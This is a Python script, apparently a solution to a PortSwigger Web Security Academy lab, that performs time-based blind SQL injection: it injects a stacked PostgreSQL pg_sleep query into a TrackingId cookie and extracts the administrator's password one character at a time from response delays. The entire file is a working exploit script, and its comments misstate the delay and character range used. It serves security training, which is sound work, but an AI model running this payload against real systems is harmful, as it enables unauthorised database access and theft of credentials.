# https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

import urllib3
import urllib
import sys
import requests

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def blind_sqli(url):
    password_extracted = ""

    # Loop through each position in the password (assuming it's up to 20 characters long)
    for i in range(1, 21):

        # Loop through ASCII values of printable characters (32 to 126) - https://theasciicode.com.ar/
        for j in range(48, 122):

            # Construct SQL injection payload
            # If the first expression is true, the response will take 10 seconds
            sqli_payload = "';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,%s,1)='%s') THEN pg_sleep(3) ELSE pg_sleep(0) END FROM users--" % (i, chr(j))

            # URL-encode the payload
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)

            # Set up cookies with the injected payload
            cookies = {'TrackingId': 'sGmI1jnSEqBbogUc' + sqli_payload_encoded, 'session': 'N84vrByRs6yHg8uoOozQTMPH1zQUCyy3'}

            # Send the HTTP request to the target URL with the payload
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)

            # print(r.elapsed.total_seconds())

            # Check if time response was below 10 seconds
            if r.elapsed.total_seconds() < 3:
                sys.stdout.write('\r' + password_extracted + chr(j))
                sys.stdout.flush()
            else:
                # If the correct character is found (response time above 10 seconds), append it to the extracted password
                password_extracted += chr(j)
                sys.stdout.write('\r' + password_extracted)
                sys.stdout.flush()
                break  # Move on to the next character in the password

def main():
    if len(sys.argv) != 2:
        print("Usage: %s <URL>" % sys.argv[0])
        print("Example: %s https://victim.com" % sys.argv[0])

    url = sys.argv[1]
    print("Retrieving administrador password...")
    blind_sqli(url)

if __name__ == "__main__":
    main()
